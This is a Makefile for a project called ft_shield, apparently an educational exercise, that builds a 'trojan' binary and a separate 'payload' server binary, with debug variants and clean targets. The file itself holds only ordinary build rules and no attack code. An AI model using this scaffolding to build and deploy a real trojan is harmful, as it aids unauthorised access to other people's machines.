NAME = ft_shield
PAYLOAD_NAME = server
OBJ_DIR = obj
SRC_DIR = src
INC_DIR = inc
LIBFT_DIR = libft

BLOCK_SIZE=$(shell stat -fc %s .)

COMMON_SRCS = log.c
PAYLOAD_SRCS = payload/main.c
SRCS = trojan/main.c

OBJS = $(addprefix $(OBJ_DIR)/, $(SRCS:.c=.o) $(COMMON_SRCS:.c=.o))
PAYLOAD_OBJS = $(addprefix $(OBJ_DIR)/, $(PAYLOAD_SRCS:.c=.o) $(COMMON_SRCS:.c=.o))

DEBUG_OBJS = $(addprefix $(OBJ_DIR)/debug/, $(SRCS:.c=.o) $(COMMON_SRCS:.c=.o))
DEBUG_PAYLOAD_OBJS = $(addprefix $(OBJ_DIR)/debug/, $(PAYLOAD_SRCS:.c=.o) $(COMMON_SRCS:.c=.o))

HEADERS = $(wildcard $(INC_DIR)/*.h) $(wildcard $(LIBFT_DIR)/src/**/*.h)
LIBFT = $(LIBFT_DIR)/libft.a
LIBFT_FLAGS = -L$(LIBFT_DIR) -lft

CC = cc
CFLAGS = -Wall -Wextra -Werror -I$(INC_DIR) -I$(LIBFT_DIR)/inc -DBLOCK_SIZE=$(BLOCK_SIZE)
DEBUG_FLAGS = -DDEBUG=1 -g
LDFLAGS = $(LIBFT_FLAGS)

all: $(LIBFT) payload trojan

debug: $(LIBFT) debug-payload debug-trojan

payload: $(PAYLOAD_OBJS) $(LIBFT)
	$(CC) $(CFLAGS) $(PAYLOAD_OBJS) -o $(PAYLOAD_NAME) $(LDFLAGS)

trojan: $(OBJS) $(LIBFT)
	$(CC) $(CFLAGS) $(OBJS) -o $(NAME) $(LDFLAGS)

debug-payload: $(DEBUG_PAYLOAD_OBJS) $(LIBFT)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) $(DEBUG_PAYLOAD_OBJS) -o $(PAYLOAD_NAME) $(LDFLAGS)

debug-trojan: $(DEBUG_OBJS) $(LIBFT)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) $(DEBUG_OBJS) -o $(NAME) $(LDFLAGS)

$(LIBFT):
	$(MAKE) -C $(LIBFT_DIR)

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c $(HEADERS) | $(OBJ_DIR)
	mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: %.c $(HEADERS) | $(OBJ_DIR)
	mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/debug/%.o: $(SRC_DIR)/%.c $(HEADERS) | $(OBJ_DIR)
	mkdir -p $(dir $@)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) -c $< -o $@

$(OBJ_DIR)/debug/%.o: %.c $(HEADERS) | $(OBJ_DIR)
	mkdir -p $(dir $@)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) -c $< -o $@

$(OBJ_DIR):
	mkdir -p $(OBJ_DIR)/payload
	mkdir -p $(OBJ_DIR)/trojan
	mkdir -p $(OBJ_DIR)/debug/payload
	mkdir -p $(OBJ_DIR)/debug/trojan

clean:
	rm -rf $(OBJ_DIR)

fclean: clean
	rm -f $(NAME) $(PAYLOAD_NAME)

re: fclean all

.PHONY: all debug clean fclean re debug-payload debug-trojan payload trojan
